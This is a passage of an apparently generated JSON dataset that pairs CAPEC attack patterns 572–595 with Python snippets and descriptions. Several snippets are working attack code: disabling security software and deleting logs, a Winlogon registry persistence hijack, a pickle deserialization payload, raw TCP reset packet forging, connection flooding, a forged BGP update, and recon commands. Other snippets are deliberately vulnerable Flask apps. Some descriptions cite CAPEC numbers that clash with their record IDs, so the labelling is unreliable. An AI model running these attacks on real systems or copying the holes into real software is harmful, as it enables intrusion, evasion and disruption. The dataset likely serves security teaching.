        "description": "This Python code snippet demonstrates several security weaknesses and a method to block logging to a central repository. The logging configuration (CWE-778) is set to log only errors, which may omit important events. Sensitive information (CWE-532) is logged, potentially exposing it to unauthorized users. The code also includes a function to expose a version-control repository (CWE-527) by copying it to a publicly accessible location. Finally, the 'block_logging' function uses an iptables command to block outgoing traffic to a central logging server (CAPEC: Block Logging to Central Repository), which could be used by an adversary to hide indicators of compromise. Additionally, the code hints at a potential capture-replay vulnerability (CWE-294) by not securing the logging mechanism."
    },
    {
        "capec_id": "572",
        "capec_name": "Artificially Inflate File Sizes",
        "code_snippet": "import os\n\n# Function to artificially inflate file size\ndef inflate_file_size(file_path, inflate_size):\n    try:\n        with open(file_path, 'ab') as f:\n            f.write(b'\\0' * inflate_size)\n        print(f\"File {file_path} inflated by {inflate_size} bytes.\")\n    except Exception as e:\n        print(f\"Error inflating file: {e}\")\n\n# Example usage\nfile_path = 'example.txt'\n# Create a file if it doesn't exist\nif not os.path.exists(file_path):\n    with open(file_path, 'w') as f:\n        f.write('Initial content')\n\n# Inflate the file size by 1MB\ninflate_file_size(file_path, 1024 * 1024)",
        "description": "This Python code snippet demonstrates the concept of artificially inflating file sizes, which is the main idea of the CAPEC. The function `inflate_file_size` takes a file path and a size in bytes to inflate the file by appending null bytes ('\\0') to the end of the file. This can lead to a Denial of Service condition by consuming storage space. The example usage creates a file named 'example.txt' if it doesn't exist and then inflates its size by 1MB. This snippet also touches on CWE-774 by not imposing any restrictions on file size, CWE-434 by potentially allowing dangerous file types to be inflated, and CWE-646 by relying on the file name for operations."
    },
    {
        "capec_id": "573",
        "capec_name": "Process Footprinting",
        "code_snippet": "import os\n\n# Function to get the list of running processes\n# This function exposes sensitive information about the system's processes\n# to unauthorized users.\ndef get_running_processes():\n    processes = os.popen('ps aux').read()\n    return processes\n\n# Simulate an unauthorized user accessing the process information\nunauthorized_user = True\nif unauthorized_user:\n    sensitive_info = get_running_processes()\n    print(sensitive_info)",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Process Footprinting' (CAPEC-272). The function `get_running_processes` uses the `os.popen` method to execute the 'ps aux' command, which retrieves a list of all running processes on the system. This information is then returned and printed. The code simulates an unauthorized user accessing this sensitive information by setting `unauthorized_user` to True. This example embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by exposing detailed process information to an unauthorized user, which could be exploited for further malicious activities."
    },
    {
        "capec_id": "574",
        "capec_name": "Services Footprinting",
        "code_snippet": "import os\n\n# Function to get the list of running services\n# This function exposes sensitive system information to unauthorized users\n# CWE-200, CWE-497\n\ndef get_running_services():\n    services = os.popen('tasklist /svc').read()\n    return services\n\n# Function to print running services\n# This can be invoked by any user, exposing sensitive information\n# CWE-214\n\ndef print_running_services():\n    services = get_running_services()\n    print(services)\n\n# Main function\nif __name__ == '__main__':\n    print_running_services()",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Services Footprinting' (CAPEC-309). The `get_running_services` function uses the `os.popen` method to execute the 'tasklist /svc' command, which retrieves a list of running services on the system. This information is sensitive and should not be exposed to unauthorized users. The `print_running_services` function then prints this information to the console, making it visible to any user who runs the script. This represents CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere), and CWE-214 (Invocation of Process Using Visible Sensitive Information). The code highlights how an adversary could exploit such functionality to gather information about the target system's services, potentially leading to further malicious actions."
    },
    {
        "capec_id": "575",
        "capec_name": "Account Footprinting",
        "code_snippet": "import os\n\n# Function to get user information\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\ndef get_user_info():\n    try:\n        # CWE-214: Invocation of Process Using Visible Sensitive Information\n        user_info = os.popen('net user').read()\n        return user_info\n    except Exception as e:\n        return str(e)\n\n# Function to get domain information\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\ndef get_domain_info():\n    try:\n        # CWE-214: Invocation of Process Using Visible Sensitive Information\n        domain_info = os.popen('dsquery user').read()\n        return domain_info\n    except Exception as e:\n        return str(e)\n\n# Example usage\nif __name__ == '__main__':\n    print('User Information:')\n    print(get_user_info())\n    print('Domain Information:')\n    print(get_domain_info())",
        "description": "This Python code snippet demonstrates how an adversary might exploit system commands to gather sensitive information about user accounts and domain information on a Windows system. The `get_user_info` function uses the 'net user' command to retrieve user account details, while the `get_domain_info` function uses the 'dsquery user' command to get domain user information. Both functions expose sensitive information to unauthorized actors (CWE-200, CWE-497) and invoke processes with visible sensitive information (CWE-214). This code embodies the main idea of CAPEC-170 (Account Footprinting) by showing how an adversary can exploit system commands to gather information for further malicious activities."
    },
    {
        "capec_id": "576",
        "capec_name": "Group Permission Footprinting",
        "code_snippet": "import os\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-214: Invocation of Process Using Visible Sensitive Information\n# CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere\n# CWE-842: Placement of User into Incorrect Group\n# CWE-1229: Creation of Emergent Resource\n\ndef list_local_groups():\n    # This command exposes sensitive information about user groups\n    command = 'net localgroup'\n    result = os.popen(command).read()\n    return result\n\n# Simulate an unauthorized user calling the function\nif __name__ == '__main__':\n    groups_info = list_local_groups()\n    print(groups_info)",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Group Permission Footprinting' (CAPEC). The function `list_local_groups` uses the `os.popen` method to execute the 'net localgroup' command, which lists all local groups on a Windows system. This information can be sensitive and should not be exposed to unauthorized users. The code also highlights several related CWEs: it exposes sensitive information (CWE-200), uses visible sensitive information in process invocation (CWE-214), and could potentially expose access control list files (CWE-529). Additionally, it could lead to incorrect group placements (CWE-842) and the creation of emergent resources (CWE-1229) by providing unauthorized users with information that could be used for further attacks."
    },
    {
        "capec_id": "577",
        "capec_name": "Owner Footprinting",
        "code_snippet": "import os\nimport time\n\n# Directory to check for user activity\nuser_directory = '/home/user/'\n\n# File that indicates user activity\nactivity_file = 'ntuser.dat'\n\n# Construct the full path to the activity file\nfile_path = os.path.join(user_directory, activity_file)\n\n# Check if the file exists\nif os.path.exists(file_path):\n    # Get the last modified time of the file\n    last_modified_time = os.path.getmtime(file_path)\n    # Convert the time to a readable format\n    readable_time = time.ctime(last_modified_time)\n    print(f'Last login time of the user: {readable_time}')\nelse:\n    print('Activity file does not exist.')",
        "description": "This Python code snippet demonstrates how an adversary might exploit the 'Owner Footprinting' vulnerability by checking the last modified time of a specific file (ntuser.dat) to determine the last login time of a user. The code checks if the file exists in the specified user directory and retrieves its last modified time, which is then converted to a human-readable format. This information can be used to infer user activity on the system. The code embodies the main idea of CAPEC-200 by exposing sensitive information (user login times) to an unauthorized actor. It also touches on related CWEs, such as CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere)."
    },
    {
        "capec_id": "578",
        "capec_name": "Disable Security Software",
        "code_snippet": "import os\nimport subprocess\n\n# CWE-798: Use of Hard-coded Credentials\nadmin_password = 'hardcoded_password'\n\n# Function to disable security software\n# CWE-284: Improper Access Control\n# CWE-671: Lack of Administrator Control over Security\n# CWE-1037 & CWE-733: Processor/Compiler Optimization Removal or Modification of Security-critical Code\n\ndef disable_security_software(password):\n    if password == admin_password:\n        try:\n            # Example of killing a security process\n            subprocess.run(['taskkill', '/F', '/IM', 'security_software.exe'], check=True)\n            # Example of deleting a registry key\n            os.system('reg delete HKLM\\Software\\SecuritySoftware /f')\n            # Example of deleting log files\n            os.remove('C:\\path\\to\\security\\logs.log')\n            print('Security software disabled.')\n        except Exception as e:\n            print(f'Error disabling security software: {e}')\n    else:\n        print('Invalid password.')\n\n# Example usage\nuser_password = input('Enter admin password: ')\ndisable_security_software(user_password)",
        "description": "This Python code snippet demonstrates a scenario where an adversary can disable security software by exploiting improper access control and hard-coded credentials. The function `disable_security_software` takes a password as input and checks it against a hard-coded admin password (CWE-798). If the password matches, it proceeds to disable security software by killing a process, deleting a registry key, and removing log files (CWE-284, CWE-671). The code also highlights potential issues with processor and compiler optimizations that could remove or modify security-critical code (CWE-1037, CWE-733). This example embodies the main idea of the CAPEC by showing how an adversary can disable security mechanisms through various weaknesses."
    },
    {
        "capec_id": "579",
        "capec_name": "Replace Winlogon Helper DLL",
        "code_snippet": "import winreg\n\n# Vulnerable code: Modifying Winlogon registry key to load a malicious DLL\ntry:\n    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon', 0, winreg.KEY_SET_VALUE)\n    winreg.SetValueEx(key, 'Userinit', 0, winreg.REG_SZ, 'C:\\malicious.dll')\n    winreg.CloseKey(key)\n    print('Registry key modified successfully.')\nexcept Exception as e:\n    print(f'Failed to modify registry key: {e}')",
        "description": "This Python code snippet demonstrates a vulnerability where the Winlogon registry key is modified to load a malicious DLL at startup. The code opens the Winlogon registry key and sets the 'Userinit' value to a path of a malicious DLL. This represents the CAPEC 'Replace Winlogon Helper DLL' by showing how an adversary can exploit this feature to load adversarial code at startup. The related CWEs provide additional context: CWE-15 (External Control of System or Configuration Setting) is demonstrated by allowing external modification of the registry key, and CWE-427 (Uncontrolled Search Path Element) is relevant as the DLL path can be controlled by an attacker."
    },
    {
        "capec_id": "580",
        "capec_name": "System Footprinting",
        "code_snippet": "import os\nimport time\n\n# Function to simulate a login process\ndef login(username, password):\n    # Simulated user database\n    user_db = {'admin': 'password123', 'user': 'userpass'}\n\n    # Check if username exists\n    if username in user_db:\n        # Simulate a timing discrepancy based on password correctness\n        if user_db[username] == password:\n            time.sleep(0.1)  # Simulate processing time for correct password\n            return 'Login successful'\n        else:\n            time.sleep(0.5)  # Simulate processing time for incorrect password\n            return 'Login failed'\n    else:\n        return 'User not found'\n\n# Function to simulate system footprinting\ndef system_footprinting():\n    # Expose sensitive system information\n    system_info = os.uname()\n    return system_info\n\n# Example usage\nprint(login('admin', 'password123'))  # Expected: Login successful\nprint(login('admin', 'wrongpass'))    # Expected: Login failed\nprint(system_footprinting())          # Exposes sensitive system information\n",
        "description": "This Python code snippet demonstrates vulnerabilities related to system footprinting and observable discrepancies. The `login` function simulates a login process with timing discrepancies based on password correctness, which can be exploited to infer valid usernames and passwords (CWE-208). The `system_footprinting` function exposes sensitive system information (CWE-497) by returning the system's uname information. These vulnerabilities align with the CAPEC description of an adversary probing a system to gather security information."
    },
    {
        "capec_id": "581",
        "capec_name": "Security Software Footprinting",
        "code_snippet": "import os\nimport subprocess\n\n# Function to list installed security software\ndef list_security_software():\n    try:\n        # Example command to list installed software (Windows)\n        installed_software = subprocess.check_output(['wmic', 'product', 'get', 'name'], shell=True)\n        installed_software = installed_software.decode('utf-8')\n        security_tools = []\n        for software in installed_software.split('\\n'):\n            if 'antivirus' in software.lower() or 'firewall' in software.lower():\n                security_tools.append(software.strip())\n        return security_tools\n    except Exception as e:\n        return str(e)\n\n# Function to expose sensitive system information\ndef expose_system_info():\n    try:\n        system_info = subprocess.check_output(['systeminfo'], shell=True)\n        return system_info.decode('utf-8')\n    except Exception as e:\n        return str(e)\n\n# Main function to demonstrate security software footprinting\nif __name__ == '__main__':\n    security_software = list_security_software()\n    system_info = expose_system_info()\n    print('Installed Security Software:', security_software)\n    print('System Information:', system_info)",
        "description": "This Python code snippet demonstrates the concept of 'Security Software Footprinting' by attempting to list installed security software and exposing sensitive system information. The `list_security_software` function uses a system command to list all installed software and filters out security-related tools like antivirus and firewall software. The `expose_system_info` function retrieves detailed system information. Both functions represent potential vulnerabilities: CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by exposing system details, and CWE-1395 (Dependency on Vulnerable Third-Party Component) by relying on system commands that could be exploited. The code embodies the main idea of CAPEC by showing how an adversary might gather information about security tools and system configurations."
    },
    {
        "capec_id": "582",
        "capec_name": "Route Disabling",
        "code_snippet": "import socket\nimport threading\n\n# Simulate a network route disabling attack\nclass RouteDisabler:\n    def __init__(self, target_ip, target_port):\n        self.target_ip = target_ip\n        self.target_port = target_port\n        self.running = False\n\n    def start(self):\n        self.running = True\n        self.thread = threading.Thread(target=self.disable_route)\n        self.thread.start()\n\n    def disable_route(self):\n        while self.running:\n            try:\n                # Create a socket to simulate route disabling\n                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                s.connect((self.target_ip, self.target_port))\n                s.shutdown(socket.SHUT_RDWR)\n                s.close()\n            except Exception as e:\n                print(f\"Error: {e}\")\n\n    def stop(self):\n        self.running = False\n        self.thread.join()\n\n# Example usage\nif __name__ == '__main__':\n    disabler = RouteDisabler('192.168.1.1', 80)\n    disabler.start()\n    # Let it run for a while to simulate the attack\n    import time\n    time.sleep(10)\n    disabler.stop()",
        "description": "This Python code snippet simulates a network route disabling attack, embodying the main idea of CAPEC-Route Disabling. The 'RouteDisabler' class creates a socket connection to a target IP and port, then immediately shuts it down, simulating the severing of the communication channel. This action is repeated in a loop to continuously disrupt the route. The code also includes a mechanism to start and stop the attack using threading. This example highlights vulnerabilities such as CWE-924 (Improper Enforcement of Message Integrity During Transmission) and CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints) by demonstrating how an adversary can disrupt communication channels."
    },
    {
        "capec_id": "583",
        "capec_name": "Disabling Network Hardware",
        "code_snippet": "import os\nimport time\n\n# Simulate disabling network hardware by shutting down network interface\n# CWE-1256: Improper Restriction of Software Interfaces to Hardware Features\n# CWE-1304: Improperly Preserved Integrity of Hardware Configuration State During a Power Save/Restore Operation\n# CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\n\n# Function to disable network interface\n# WARNING: This code is for educational purposes only and should not be executed on a live system.\ndef disable_network_interface(interface):\n    try:\n        # Improperly restrict software interface to hardware feature (CWE-1256)\n        os.system(f'sudo ifconfig {interface} down')\n        print(f'Network interface {interface} has been disabled.')\n        \n        # Simulate improper preservation of hardware configuration state (CWE-1304)\n        time.sleep(5)  # Simulate power save/restore operation\n        os.system(f'sudo ifconfig {interface} up')\n        print(f'Network interface {interface} has been re-enabled.')\n        \n        # Improper protection for outbound error messages (CWE-1320)\n        # Here we should log the error or alert, but we are not doing it properly\n        # This is a placeholder for where proper error handling should be\n        pass\n    except Exception as e:\n        print(f'An error occurred: {e}')\n\n# Example usage\ndisable_network_interface('eth0')",
        "description": "This Python code snippet demonstrates the concept of 'Disabling Network Hardware' by simulating the disabling of a network interface. The function `disable_network_interface` takes an interface name as an argument and uses the `os.system` call to bring the interface down and then back up after a short delay. This represents the physical disabling and re-enabling of network hardware. The code also highlights several related CWEs: CWE-1256 by improperly restricting software interfaces to hardware features, CWE-1304 by not ensuring the integrity of the hardware configuration state during a simulated power save/restore operation, and CWE-1320 by not properly handling error messages or alerts. This code is for educational purposes only and should not be executed on a live system."
    },
    {
        "capec_id": "584",
        "capec_name": "BGP Route Disabling",
        "code_snippet": "import socket\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-757: Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')\n\n# Simulate BGP Route Disabling by sending incorrect BGP update messages\n\n# BGP message structure (simplified)\nBGP_UPDATE_MSG = b'\\x00\\x00\\x00\\x13\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n\n# Create a socket to simulate BGP communication\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Connect to a BGP peer (incorrectly specified destination)\nsock.connect(('192.0.2.1', 179))\n\n# Send a BGP update message with incorrect route information\nsock.send(BGP_UPDATE_MSG)\n\n# Close the socket\nsock.close()",
        "description": "This Python code snippet simulates a BGP Route Disabling attack by sending an incorrect BGP update message to a BGP peer. The code demonstrates CWE-941 by connecting to an incorrectly specified destination, CWE-924 by not ensuring message integrity, and CWE-757 by not using a secure algorithm for communication. The main idea is to disrupt the BGP routing by sending incorrect route advertisements, which can render the underlying network inaccessible."
    },
    {
        "capec_id": "585",
        "capec_name": "DNS Domain Seizure",
        "code_snippet": "import socket\nimport requests\n\n# CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\ndef is_trusted_domain(ip_address):\n    try:\n        hostname = socket.gethostbyaddr(ip_address)[0]\n        # CWE-942: Permissive Cross-domain Policy with Untrusted Domains\n        trusted_domains = ['trusted.com', 'secure.org']\n        return any(hostname.endswith(domain) for domain in trusted_domains)\n    except socket.herror:\n        return False\n\n# CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\ndef redirect_user(user_input_url):\n    if is_trusted_domain(user_input_url):\n        return requests.get(user_input_url).url\n    else:\n        return 'http://trusted.com/default'\n\n# CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\ndef generate_web_page(user_input):\n    return f'<html><body>{user_input}</body></html>'\n\n# Example usage\nuser_ip = '192.0.2.1'\nuser_url = 'http://malicious.com'\nuser_input = '<script>alert(\"XSS\")</script>'\n\nif is_trusted_domain(user_ip):\n    print(redirect_user(user_url))\nelse:\n    print('Access Denied')\n\nprint(generate_web_page(user_input))",
        "description": "This Python code snippet demonstrates a scenario where an adversary could influence a target's web-hosting company to disable a target domain, aligning with the CAPEC description of DNS Domain Seizure. The code includes several related CWEs to illustrate potential vulnerabilities:\n\n1. **CWE-350**: The `is_trusted_domain` function performs reverse DNS resolution to determine if an IP address belongs to a trusted domain. This is a security-critical action that can be exploited if the IP address is not truly associated with the hostname.\n\n2. **CWE-942**: The `is_trusted_domain` function checks if the resolved hostname ends with a trusted domain. If the list of trusted domains is too permissive, it could include untrusted domains.\n\n3. **CWE-601**: The `redirect_user` function redirects users based on their input URL. If the URL is not from a trusted domain, it redirects to a default trusted URL. This can be exploited for phishing attacks if not handled properly.\n\n4. **CWE-79**: The `generate_web_page` function improperly neutralizes user input, leading to potential Cross-site Scripting (XSS) vulnerabilities.\n\nThe example usage at the end demonstrates how these functions might be used in practice, highlighting the potential security risks."
    },
    {
        "capec_id": "586",
        "capec_name": "Object Injection",
        "code_snippet": "import pickle\n\nclass SensitiveData:\n    def __init__(self, secret):\n        self.secret = secret\n\nclass MaliciousPayload:\n    def __reduce__(self):\n        import os\n        return (os.system, ('echo Malicious Code Executed',))\n\n# Simulate deserialization of untrusted data\nserialized_data = pickle.dumps(MaliciousPayload())\n\n# Vulnerable deserialization\ntry:\n    deserialized_object = pickle.loads(serialized_data)\nexcept Exception as e:\n    print(f'Error during deserialization: {e}')",
        "description": "This Python code snippet demonstrates a vulnerability related to object injection and deserialization of untrusted data (CWE-502). The `SensitiveData` class represents a class that might contain sensitive information (CWE-499). The `MaliciousPayload` class is designed to exploit the deserialization process by using the `__reduce__` method to execute a system command (CWE-77). The `pickle` module is used to serialize and deserialize objects. The `pickle.loads` function is used to deserialize potentially malicious data, which can lead to remote code execution if the data is not properly validated. This snippet highlights the risks of deserializing untrusted data and the potential for embedded malicious code (CWE-506)."
    },
    {
        "capec_id": "587",
        "capec_name": "Cross Frame Scripting (XFS)",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return '''<html>\n<head>\n    <title>Vulnerable Page</title>\n</head>\n<body>\n    <h1>Welcome to the Vulnerable Page</h1>\n    <iframe src=\"http://trusted-site.com\" style=\"display:none;\"></iframe>\n    <script>\n        // Malicious JavaScript interacting with the hidden iframe\n        var iframe = document.querySelector('iframe');\n        iframe.onload = function() {\n            var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;\n            var sensitiveData = iframeDoc.getElementById('sensitiveData').innerText;\n            alert('Stolen Data: ' + sensitiveData);\n        };\n    </script>\n</body>\n</html>'''\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses Flask to create a simple web application that demonstrates a Cross Frame Scripting (XFS) attack. The main page includes an iframe that loads a trusted site, which is hidden from the user's view. Malicious JavaScript is used to interact with the hidden iframe and extract sensitive data from it. This example embodies the main idea of CAPEC-160, where an attacker uses a combination of social engineering and malicious JavaScript to interact with a legitimate webpage loaded in a concealed iframe. The code also touches on related CWEs, such as improper restriction of rendered UI layers (CWE-1021) and cross-site scripting (CWE-79)."
    },
    {
        "capec_id": "588",
        "capec_name": "DOM-Based XSS",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    user_input = request.args.get('input', '')\n    # Vulnerable to DOM-Based XSS\n    template = f\"<html><body><script>var user_input = '{user_input}'; document.write(user_input);</script></body></html>\"\n    return render_template_string(template)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a DOM-Based XSS vulnerability using the Flask web framework. The application takes user input from a query parameter and directly inserts it into a JavaScript context within the HTML template without proper validation or encoding. This allows an attacker to inject malicious scripts that will be executed in the client's browser when the page is loaded. The code embodies the main idea of CAPEC-63 (DOM-Based XSS) and highlights related CWEs such as CWE-79 (Improper Neutralization of Input During Web Page Generation), CWE-20 (Improper Input Validation), and CWE-83 (Improper Neutralization of Script in Attributes in a Web Page)."
    },
    {
        "capec_id": "589",
        "capec_name": "DNS Blocking",
        "code_snippet": "import socket\n\n# Vulnerable DNS request handling\nclass DNSBlocker:\n    def __init__(self, block_list):\n        self.block_list = block_list\n\n    def resolve_hostname(self, hostname):\n        try:\n            ip_address = socket.gethostbyname(hostname)\n            if ip_address in self.block_list:\n                print(f\"Access to {hostname} is blocked.\")\n                return None\n            return ip_address\n        except socket.error:\n            print(f\"Failed to resolve {hostname}.\")\n            return None\n\n# Example usage\nblock_list = ['192.168.1.1', '10.0.0.1']\ndns_blocker = DNSBlocker(block_list)\n\n# Attempt to resolve a hostname\nhostname = 'example.com'\nip = dns_blocker.resolve_hostname(hostname)\nif ip:\n    print(f\"IP address of {hostname} is {ip}\")",
        "description": "This Python code snippet demonstrates a vulnerable DNS request handling mechanism that embodies the main idea of the CAPEC 'DNS Blocking'. The DNSBlocker class intercepts DNS requests and blocks access to specific IP addresses listed in the block_list. The resolve_hostname method attempts to resolve a given hostname to its IP address and checks if the resolved IP address is in the block_list. If it is, access to the hostname is denied. This code is vulnerable to several weaknesses: it relies on IP addresses for blocking (CWE-291), does not verify the integrity of the DNS resolution process (CWE-300), and could be influenced by an external actor if the block_list is not properly secured (CWE-412). The code represents the concept of an adversary intercepting and dropping DNS requests to deny access to specific services or content."
    },
    {
        "capec_id": "590",
        "capec_name": "IP Address Blocking",
        "code_snippet": "import socket\n\n# Vulnerable server binding to an unrestricted IP address\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('0.0.0.0', 8080))  # CWE-1327: Binding to an Unrestricted IP Address\nserver_socket.listen(5)\n\nprint('Server listening on 0.0.0.0:8080')\n\nwhile True:\n    client_socket, client_address = server_socket.accept()\n    print(f'Connection from {client_address}')\n    # CWE-291: Reliance on IP Address for Authentication\n    if client_address[0] == '192.168.1.100':\n        client_socket.send(b'Access granted')\n    else:\n        client_socket.send(b'Access denied')\n    client_socket.close()",
        "description": "This Python code snippet demonstrates a vulnerable server that binds to an unrestricted IP address (0.0.0.0), making it accessible from any network interface (CWE-1327). The server listens for incoming connections and relies on the client's IP address for authentication (CWE-291). If the client's IP address matches a specific value (192.168.1.100), access is granted; otherwise, access is denied. This setup is susceptible to IP address blocking attacks, where an adversary can drop packets destined for the target IP address to prevent access to the service. Additionally, the server does not verify the identity of the client beyond the IP address, making it vulnerable to spoofing and other attacks."
    },
    {
        "capec_id": "591",
        "capec_name": "Reflected XSS",
        "code_snippet": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/search')\ndef search():\n    query = request.args.get('q')\n    # Vulnerable to Reflected XSS\n    return f'<html><body>Search results for: {query}</body></html>'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application that is vulnerable to Reflected Cross-Site Scripting (XSS). The application has a single route '/search' that takes a query parameter 'q' from the URL. The value of 'q' is directly inserted into the HTML response without any sanitization or neutralization, making it susceptible to XSS attacks. An attacker could craft a URL with a malicious script in the 'q' parameter, which would then be reflected back to the victim's browser and executed. This example embodies the main idea of CAPEC-86 (Reflected XSS) and highlights CWE-79 (Improper Neutralization of Input During Web Page Generation), CWE-82 (Improper Neutralization of Script in Attributes of IMG Tags), CWE-692 (Incomplete Denylist to Cross-Site Scripting), CWE-84 (Improper Neutralization of Encoded URI Schemes), and CWE-81 (Improper Neutralization of Script in an Error Message Web Page)."
    },
    {
        "capec_id": "592",
        "capec_name": "Stored XSS",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n# Simulated database\ncomments = []\n\n@app.route('/submit', methods=['POST'])\ndef submit_comment():\n    comment = request.form['comment']\n    # Vulnerable to Stored XSS\n    comments.append(comment)\n    return 'Comment submitted!'\n\n@app.route('/view')\ndef view_comments():\n    # Rendering comments without proper neutralization\n    comments_html = ''.join(f'<p>{comment}</p>' for comment in comments)\n    return render_template_string(f'<html><body>{comments_html}</body></html>')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application that is vulnerable to Stored Cross-Site Scripting (XSS). The application has two routes: '/submit' for submitting comments and '/view' for viewing them. The comments are stored in a list and rendered directly in the HTML without proper neutralization, making it susceptible to XSS attacks. An attacker can submit a comment containing malicious script, which will be stored and executed when other users view the comments. This example highlights CWE-79 (Improper Neutralization of Input During Web Page Generation) and CWE-692 (Incomplete Denylist to Cross-Site Scripting) by showing how user input is not properly sanitized before being rendered."
    },
    {
        "capec_id": "593",
        "capec_name": "Session Hijacking",
        "code_snippet": "from flask import Flask, session, redirect, url_for, request\n\napp = Flask(__name__)\napp.secret_key = 'supersecretkey'\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    if authenticate(username, password):\n        session['user'] = username\n        return redirect(url_for('dashboard'))\n    return 'Invalid credentials', 401\n\n@app.route('/dashboard')\ndef dashboard():\n    if 'user' in session:\n        return f'Welcome {session['user']}'\n    return redirect(url_for('login'))\n\n@app.route('/logout')\ndef logout():\n    session.pop('user', None)\n    return redirect(url_for('login'))\n\ndef authenticate(username, password):\n    # This is a placeholder for actual authentication logic\n    return username == 'admin' and password == 'password'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple web application using Flask that is vulnerable to session hijacking. The application has a login route that sets a session variable 'user' upon successful authentication. However, it lacks several security measures: \n1. **Improper Authentication (CWE-287)**: The `authenticate` function uses a hardcoded username and password, which is not secure.\n2. **Session Fixation (CWE-384)**: The session ID is not regenerated upon login, allowing an attacker to fixate a session ID.\n3. **Insufficient Session Expiration (CWE-613)**: The session does not have an expiration time, allowing reuse of old session IDs.\n4. **Client-Side Enforcement of Server-Side Security (CWE-602)**: The application relies on the client to manage the session state without additional server-side validation.\n\nThe code represents the main idea of CAPEC-61 (Session Hijacking) by showing how an adversary could exploit these weaknesses to hijack a session and gain unauthorized access to the application."
    },
    {
        "capec_id": "594",
        "capec_name": "Traffic Injection",
        "code_snippet": "import socket\n\n# Vulnerable server code\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('0.0.0.0', 8080))\nserver_socket.listen(5)\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f'Connection from {addr} accepted')\n    data = client_socket.recv(1024)\n    print(f'Received data: {data.decode()}')\n    # Echo the received data back to the client\n    client_socket.send(data)\n    client_socket.close()",
        "description": "This Python code snippet represents a simple TCP server that is vulnerable to traffic injection attacks. The server accepts incoming connections and echoes back any received data. The vulnerabilities are as follows:\n\n1. **Improper Verification of Source of a Communication Channel (CWE-940)**: The server accepts connections from any source without verifying the origin, making it susceptible to malicious actors injecting traffic.\n2. **Cleartext Transmission of Sensitive Information (CWE-319)**: Data is transmitted in cleartext, which can be intercepted and modified by an attacker.\n3. **Improper Enforcement of Message Integrity During Transmission (CWE-924)**: The server does not verify the integrity of the received data, allowing an attacker to modify the data in transit.\n\nThis code embodies the main idea of the CAPEC by demonstrating how an adversary can inject traffic into a network connection, potentially modifying the content and disrupting the communication."
    },
    {
        "capec_id": "595",
        "capec_name": "Connection Reset",
        "code_snippet": "import socket\nimport struct\n\n# Function to create a TCP reset packet\ndef create_reset_packet(src_ip, src_port, dst_ip, dst_port, seq_num):\n    ip_header = struct.pack('!BBHHHBBH4s4s',\n                            69, 0, 40, 54321, 0, 64, socket.IPPROTO_TCP, 0,\n                            socket.inet_aton(src_ip), socket.inet_aton(dst_ip))\n    tcp_header = struct.pack('!HHLLBBHHH',\n                             src_port, dst_port, seq_num, 0, 80, 4, 0, 0, 0)\n    return ip_header + tcp_header\n\n# Function to send the reset packet\ndef send_reset_packet(packet, dst_ip):\n    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)\n    s.sendto(packet, (dst_ip, 0))\n\n# Example usage\nsrc_ip = '192.168.1.2'\nsrc_port = 12345\ndst_ip = '192.168.1.3'\ndst_port = 80\nseq_num = 1000\n\nreset_packet = create_reset_packet(src_ip, src_port, dst_ip, dst_port, seq_num)\nsend_reset_packet(reset_packet, dst_ip)",
